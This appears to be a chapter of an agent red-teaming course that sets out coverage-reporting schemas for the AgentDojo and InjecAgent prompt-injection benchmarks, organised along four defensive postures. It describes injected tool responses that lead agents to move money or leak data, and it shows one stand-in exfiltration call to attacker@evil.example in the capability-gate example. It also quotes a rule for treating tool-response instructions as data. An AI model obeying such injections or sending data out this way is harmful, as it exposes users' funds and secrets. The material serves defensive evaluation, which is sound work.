# 06 — AgentDojo and InjecAgent: Shipping Coverage Under a Defensive-Posture Matrix

## Motivation

Chapters 02–05 named the four attack families. This chapter tells the AASS how to *report coverage* — the numeric artefact the operator, the peer teams (`senior-agentic-ai-engineer`, `ai-infra-security`), and the downstream modules (mod-107, mod-108, mod-111) consume. Coverage without a defensive-posture axis is a story. "Attack succeeded" is a story; "attack succeeded under posture X at rate 0.72 and posture Y at rate 0.09" is a finding a team can prioritise on.

The two public benchmarks this module ships coverage against are **AgentDojo** (Debenedetti et al., 2024) and **InjecAgent** (Zhan et al., 2024). They are complementary rather than redundant: InjecAgent enumerates a large space of indirect-prompt-injection *test cases* against tool-integrated agents; AgentDojo simulates realistic agent *environments* (workspace, banking, travel, Slack) and pairs an attack success rate with a *utility* success rate on benign tasks. Neither is exhaustive of the AASS surface, but together they anchor the coverage matrix in something numerically comparable across model and framework generations.

This chapter defines the defensive-posture axis, maps each posture to a concrete configuration, and codifies the coverage-matrix schema and the utility-security composite the AASS reports.

## Primary sources for this chapter

- **Debenedetti, Edoardo et al., "AgentDojo: A Dynamic Environment to Evaluate Attacks and Defenses for LLM Agents," NeurIPS 2024.** Read the paper before running exercise 05 — the utility-security framing is load-bearing. <!-- needs-research: confirm the current AgentDojo release URL, suite list, and citation. -->
- **Zhan, Qiusi et al., "InjecAgent: Benchmarking Indirect Prompt Injections in Tool-Integrated Large Language Model Agents," ACL Findings 2024.** Read the paper's direct-harm vs. data-stealing distinction and the false-positive framing. <!-- needs-research: confirm the current InjecAgent release URL, version tag, and case counts. -->
- **Greshake, Kai et al., "Not what you've signed up for," AISec 2023.** The IPI attacks both benchmarks catalogue trace back to this taxonomy.
- **StrongREJECT (Souly et al., 2024) — mod-104 chapter 07.** Not a multi-agent benchmark, but the judge methodology this module inherits for chain judgement.
- **AgentBench (Liu et al., 2023) and ToolBench (Qin et al., 2023).** Auxiliary benchmarks for utility measurement in tool-integrated agents. <!-- needs-research: confirm current citations, releases, and scopes. -->

## What each benchmark actually covers

Before wiring AgentDojo and InjecAgent into the AASS, the operator should be able to state precisely what each one measures and — importantly — what it does not. The claim "we passed AgentDojo" without the qualification is misleading; the AASS's own report writes the qualification into every cell.

### AgentDojo (Debenedetti et al., 2024)

**Shape.** A framework for simulating tool-integrated agents in one of a handful of *suites*, each a realistic environment (a workspace-assistant suite, a banking suite, a travel-agent suite, a Slack workspace suite). Each suite defines a set of *tools* (email, calendar, transfer money, list flights, etc.), a set of *user tasks* (benign requests), and a set of *injection attacks* placed inside tool responses. Each trial pairs one user task with one injection attack. <!-- needs-research: confirm the current AgentDojo suite list and their scopes. -->

**What it measures.**

- **Utility.** Did the agent complete the benign user task correctly?
- **Attack success.** Did the agent execute the attack-injected action (send money to attacker, mail secrets, etc.)?
- **Utility-security trade-off.** Along a Pareto curve, a defence that lowers ASR usually lowers utility too. The AASS's report is a curve, not a single point.

**What it does not measure.**

- Attacks not enumerated in its suite catalogue.
- Cross-session persistence (chapter 03) — AgentDojo is single-session by construction.
- Cross-agent propagation (chapter 05) — AgentDojo's Slack suite touches multi-agent-shaped scenarios but the framework is not oriented at graph-level metrics like R.
- Long-horizon planning subversion (chapter 04) beyond the step budgets its user tasks embed.
- Adversarial embedding-space attacks (AgentPoison family).

**Coverage-matrix mapping.** For each AgentDojo suite:

```yaml
agentdojo_coverage:
  suite: <workspace | banking | travel | slack | ...>
  version: <agentdojo release tag>
  attacks_run: <list of attack-ids or "all">
  tasks_run: <list of task-ids or "all">
  defensive_posture: <see posture axis below>
  target_model: <model_id + snapshot>
  utility_rate: <fraction of benign tasks completed correctly>
  attack_success_rate: <fraction of trials where the attack action executed>
  judge:
    scaffold_id: agentdojo_default | strongreject_style | custom_v?
    scaffold_version: <version>
    human_agreement_sample: <k trials, agreement>
```

### InjecAgent (Zhan et al., 2024)

**Shape.** A benchmark of indirect-prompt-injection test cases against tool-integrated agents. Each case carries an attacker-controlled tool response (search snippet, mail body, calendar entry, etc.) with an embedded injected instruction, plus a user task the agent was pursuing. Cases are classified as **direct-harm** (the injected instruction causes a directly harmful tool call, e.g., transfer money to attacker) or **data-stealing** (the injected instruction causes the agent to leak information through subsequent tool calls). <!-- needs-research: confirm the current InjecAgent case count, tool-category count, and dataset URL. -->

**What it measures.**

- **Attack success rate** per category, per case, per defence.
- **Refusal rate** (agent declined to perform the injected action) as a defence's signal.
- **False-positive rate** — a defence that refuses too many benign user tasks. This is the InjecAgent-specific analogue of AgentDojo's utility axis.

**What it does not measure.**

- Rich agent-environment dynamics (InjecAgent tests are more prompt-shaped than environment-shaped compared with AgentDojo).
- Utility on benign user tasks in the same detail AgentDojo provides.
- Planning-subversion metrics beyond single-turn attack success.
- Multi-agent propagation.

**Coverage-matrix mapping.**

```yaml
injecagent_coverage:
  version: <injecagent release tag>
  categories_run: <list of categories or "all">
  cases_run: <count and/or list of case-ids>
  defensive_posture: <see posture axis below>
  target_model: <model_id + snapshot>
  attack_success_rate:
    direct_harm: <fraction>
    data_stealing: <fraction>
  refusal_rate: <fraction of trials the agent refused an injected action>
  false_positive_rate: <fraction of benign trials the agent refused>
  judge:
    scaffold_id: injecagent_default | custom_v?
    scaffold_version: <version>
```

### Why the union is not exhaustive

Together, AgentDojo and InjecAgent cover a substantial subset of the tool-abuse-chain family (chapter 02) and part of the cross-agent injection sub-family (chapter 05, in the Slack suite). They do not cover:

- Chapter 03's cross-session persistence, PoisonedRAG, and AgentPoison sub-families in depth (some benchmark work exists — cite PoisonedRAG's own evaluation and AgentPoison's own reported ASR against LangChain — but not integrated in AgentDojo/InjecAgent's harness). <!-- needs-research: confirm what integrated retrieval-poisoning benchmarks currently exist that pair with AgentDojo's environments. -->
- Chapter 04's plan-truncation, sub-agent-spawn subversion, and long-step-budget goal-drift measurements.
- Chapter 05's worm-shaped propagation with R-estimate.

The AASS's coverage matrix (below) reports on public benchmarks *and* on the module's own bench for the cells the public benchmarks miss. Chapter 07 develops the boundary against the modules that would benchmark these cells if the AASS itself does not.

## The defensive-posture axis

Every cell in the AASS's coverage matrix is measured under a defined *defensive posture*. Four postures anchor the axis; deployments can add more (constitutional classifier, spotlighting-on-tool-response, monitor-driven refusal) as needed, but the four below are the minimum.

### Posture 0 — Raw

No agent-side defence. The framework's default tool wrappers, no tool-response sanitisation beyond what the framework does implicitly, no capability gates on the tools, no HITL. This is the "how bad is it without any defence?" baseline. Every AASS run reports raw as row zero.

### Posture 1 — Tool-response sanitisation

The agent's ingress from tool responses passes through a sanitiser that (choose your loadout):

- **Spotlighting** (Hines et al., 2024) applied to tool responses: the model is told an explicit delimiter marks untrusted content and to treat instructions in that content as data. (mod-103 chapter 07 develops spotlighting.)
- **Instruction-stripping** with a policy: any imperative-shaped sentence in a tool response is masked or annotated before reaching the model.
- **Structured extraction**: tool responses are parsed into structured fields (title, body, sender, timestamp) and only the fields the current step needs are rendered.
- **Untrusted-content quarantine**: content from tool responses is stored in a distinguished namespace the model treats as data, not context.

Report the *specific* sanitiser configuration and version alongside the ASR. A cell without a config pointer is un-shippable.

### Posture 2 — Capability gates

The agent's tool bus enforces capability tokens. Each tool call requires a capability token issued for the current sub-goal, bounded by scope (which tool), argument constraints (which recipients, which URLs, which amounts), and expiry. Attacker-driven tool calls fail authorisation at the bus even if the model emits the call.

Concretely: a `mail.send` call requires a capability token whose scope names `mail.send`, whose allowed-recipients list matches an allow-list bound to the current sub-goal, and whose expiry has not passed. A chain that reads user data and emits `mail.send(to=attacker@evil.example)` fails at the bus because the token's allowed-recipients list does not include `attacker@evil.example`.

Capability gates are engineered in `ai-infra-security` and mod-107; the AASS measures their effectiveness.

### Posture 3 — Human-in-the-loop (HITL)

Every tool call the model emits is queued for operator approval before execution. The approval UX surfaces:

- **The tool being called.**
- **The full arguments** (including any URL / recipient / amount fields).
- **The recent context** the model read to decide on this call.

Approval latency, approval cadence, and the operator's approval-fatigue budget (mod-102 surface 5) shape HITL's effectiveness. The AASS's HITL runs use a realistic approval cadence (e.g., a bounded approver-per-hour rate) rather than a laboratory unlimited-approvals setup.

### Combining postures

A real deployment combines postures. The AASS supports run configurations that layer 1+2, 1+2+3, and so on. The finding schema records the composition:

```yaml
defensive_posture:
  name: <descriptive-name>
  layers: [<posture-id>, ...]
  config:
    sanitisation: <config or null>
    capability_gates: <config or null>
    hitl: <config or null>
```

The coverage matrix reports the *deltas* between composed postures — for the prioritisation question "does adding capability gates on top of sanitisation cut the residual ASR?"

## The AASS coverage matrix schema

The full coverage matrix is a five-dimensional space:

- **Attack family** — one of the four in chapters 02–05.
- **Sub-family cell** — a specific chapter's sub-family × chain shape.
- **Benchmark source** — AgentDojo suite / InjecAgent category / AASS-internal bench for cells the public benchmarks miss.
- **Defensive posture** — one of the four (or a composition).
- **Target model + snapshot + framework.**

The reporting artefact:

```yaml
aass_coverage_report:
  target:
    agent_id: <name>
    agent_version: <version>
    model: <model_id + snapshot>
    framework: <name+version>
  runs:
    - family: <tool_abuse | poisoning | planning_subversion | multi_agent>
      sub_family: <e.g. chained_exfil_search_mail_calendar>
      source: <agentdojo:workspace | injecagent:direct_harm | aass_internal:<cell>>
      cases_run: <count>
      posture: <posture spec>
      asr: <fraction>
      utility_rate: <fraction, when applicable>
      false_positive_rate: <fraction, when applicable>
      chain_length_median: <n>
      persistence_horizon: <turns / sessions / never>
      propagation_R0: <float or null>
      judge:
        scaffold_id: <id>
        scaffold_version: <version>
        human_agreement: <fraction>
      finding_refs:
        - <finding-id>, ...
  deltas:
    - {posture_a: <name>, posture_b: <name>, family: <family>, asr_delta: <float>}
  boundary_routing:
    routes_to_ai_infra_security: [<finding-id>, ...]
    routes_to_senior_agentic_ai_engineer: [<finding-id>, ...]
    routes_to_mod_107: [<finding-id>, ...]
    routes_to_mod_108: [<finding-id>, ...]
    routes_to_mod_111_scale_candidates: [<finding-id>, ...]
```

## The utility-security composite (AgentDojo pattern)

AgentDojo's core methodological insight is that reporting ASR without reporting utility is dishonest. A defence that refuses every tool call has ASR = 0 and utility = 0; a defence that permits every tool call has utility = high and ASR = high. The interesting number is a *composite*: how much utility survives at each ASR level.

The AASS inherits this pattern for every posture run:

- On every attack cell, run a paired *utility* cell — the same target agent, the same posture, but with the benign user task and *without* the attack payload. Report the utility rate for that paired cell.
- The AASS's cell is a triple: `(attack_success_rate, utility_rate, false_positive_rate)`. A cell that reports only ASR is an incomplete cell.
- Present postures on a utility-vs-ASR plane. The Pareto-improving postures are the ones that lower ASR without lowering utility. Chapter 07 develops the boundary against `ai-infra-security` and `senior-agentic-ai-engineer` on Pareto-improving pattern-level fixes.

## Judge calibration and the coverage matrix

The AASS's judges are load-bearing: the ASR the matrix reports is *the judge's estimate*. mod-104 chapter 07 develops the StrongREJECT-style judge methodology; this module inherits it for chain-level judgement with two additional requirements:

- **Judge composition.** A chain finding's judgement often requires composing multiple sub-judges: "did the injection land?" + "did the tool call fire with the smuggled argument?" + "did the effect materialise?" The overall verdict is a conjunction; a single-shot judge that returns "success" without decomposing the chain is under-specified.
- **Human-agreement per cell.** Report the judge's human-agreement number per cell of the matrix, not once for the whole run. A judge that agrees well on tool-abuse chains but poorly on planning-subversion drift is un-shippable for the planning-subversion cells.

## Cost, throughput, and the shipping envelope

Coverage matrices at real scale cost real money. Every AASS run reports:

- **Total trials.**
- **Total wall-clock time.**
- **Total token cost** (attack + target + judge) as a per-cell figure and an aggregate.
- **Throughput** — trials per hour under the run's concurrency and rate-limit envelope.

Cost matters because mod-111 industrialises the AASS; the scaled harness's affordable coverage is a function of this module's per-cell cost. A cell whose judge costs $2.30 per trial cannot be shipped at 10,000 trials per week unless the judge is reworked.

## Common engineering mistakes at the coverage-report boundary

- **Reporting one aggregate ASR instead of the matrix.** An aggregate ASR hides which cells drove the number. Every AASS report is a matrix; the aggregate is a summary line.
- **Skipping utility measurement.** A defence that lowers ASR while destroying utility is a false economy. The AASS does not accept ASR-only findings.
- **Not versioning benchmarks.** AgentDojo and InjecAgent iterate. A finding cites the benchmark's version tag; a report without version tags cannot be compared across weeks.
- **Not versioning the judge.** Judge scaffolds evolve. Every cell records the scaffold ID and version.
- **Missing snapshot pins on model versions.** Frontier APIs re-tune underneath the same endpoint. The AASS pins snapshot / date labels; findings without pins are un-reproducible.
- **Assuming AgentDojo + InjecAgent covers the AASS surface.** Chapters 03 (persistence, PoisonedRAG, AgentPoison), 04 (planning), and much of 05 (worm-shaped propagation) require AASS-internal bench cells. Report them in the same matrix; do not omit them because the public benchmark does not cover them.
- **Not reporting the delta between postures.** Deltas are the prioritisation currency for the peer teams. Every AASS report includes the pairwise delta table.

## Summary

- The AASS's coverage report is a matrix over **attack family × sub-family × benchmark source × defensive posture × target**, not a single number.
- **AgentDojo** (Debenedetti et al., 2024) is the primary agent-environment benchmark; **InjecAgent** (Zhan et al., 2024) is the primary indirect-prompt-injection benchmark; together they anchor coverage numerically, and the AASS-internal bench covers the cells they miss (chapter 03 poisoning, chapter 04 planning, chapter 05 worm propagation).
- The **defensive-posture axis** is a first-class dimension: at minimum, *raw / tool-response sanitisation / capability gates / human-in-the-loop*, and their compositions.
- Every cell reports (ASR, utility, false-positive rate) — the utility-security composite from AgentDojo — plus the chain-specific metrics from chapters 02–05 (chain length, persistence horizon, propagation R).
- Judges are versioned; human-agreement is reported per cell; the cost / throughput envelope is reported per run so mod-111 can scale the harness responsibly.
- The report's *deltas between postures* are the currency the peer teams (`ai-infra-security`, `senior-agentic-ai-engineer`, mod-107, mod-108) prioritise on.
